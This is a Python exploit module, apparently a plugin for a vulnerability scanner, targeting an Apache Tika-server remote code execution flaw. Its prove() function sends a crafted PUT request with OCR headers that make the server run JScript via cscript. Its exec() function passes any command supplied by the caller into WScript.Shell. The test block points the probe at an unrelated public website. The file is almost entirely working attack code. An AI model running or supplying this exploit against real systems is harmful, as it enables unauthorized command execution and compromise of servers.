#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

'''
https://zhuanlan.zhihu.com/p/51907363
https://www.seebug.org/vuldb/ssvid-97709
'''

import time
import random
from string import ascii_lowercase

def info(data):
    info = {
        "name": "Apache Tika-server RCE",
        "info": "Apache Tika-server RCE",
        "level": "high",
        "type": "rce",
    }
    return info

def prove(data):
    init(data,'apache')
    if data['base_url']:
        headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
                   "X-Tika-OCRLanguage": "//E:Jscript",
                   "Expect": "100-continue",
                   "Content-type": "image/jp2",
                   "Connection": "close"}

        url = data['base_url'] + "meta"
        jscript = '''var oShell = WScript.CreateObject("WScript.Shell");
        var oExec = oShell.Exec('cmd /c {}');
        '''.format('cmd /c whoami')
        try:
            res = curl('put', url, headers=headers, data=jscript)
            if res!= None and "X-Parsed-By" in res.text and "tika.parse" in res.text:
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": url, "key": "Apache Tika-server RCE"})
        except:
            pass
    return data

def exec(data):
    init(data, 'apache')
    if data['base_url']:
        headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
                   "X-Tika-OCRLanguage": "//E:Jscript",
                   "Expect": "100-continue",
                   "Content-type": "image/jp2",
                   "Connection": "close"}

        url = data['base_url'] + "meta"
        jscript = '''var oShell = WScript.CreateObject("WScript.Shell");
         var oExec = oShell.Exec('cmd /c {}');
         '''.format(data['cmd'])
        try:
            res = curl('put', url, headers=headers, data=jscript)
            if res != None and "X-Parsed-By" in res.text and "tika.parse" in res.text:
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": res.text, "key": "Apache Tika-server RCE"})
        except:
            pass
    return data

if __name__=='__main__':
    from script import init, curl,ceye_verify_api,ceye_dns_api
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))